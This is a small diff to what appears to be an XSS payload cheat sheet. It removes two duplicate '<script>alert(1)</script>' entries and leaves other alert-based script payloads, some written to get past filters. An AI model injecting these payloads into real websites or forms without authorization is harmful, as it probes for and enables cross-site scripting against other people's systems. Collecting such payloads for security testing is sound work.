@@ -40,8 +40,6 @@ Payload
 - ``<script>alert('1')</script>``
 - ``<script>alert("1")</script>``
 - ``<script>alert`1`</script>``
-- ``<script>alert(1)</script>``
-- ``<script>alert(1)</script>``
 - ``<script>(alert)(1)</script>``
 - ``<script>a=alert,a(1)</script>``
 - ``<script>[1].find(alert)</script>``
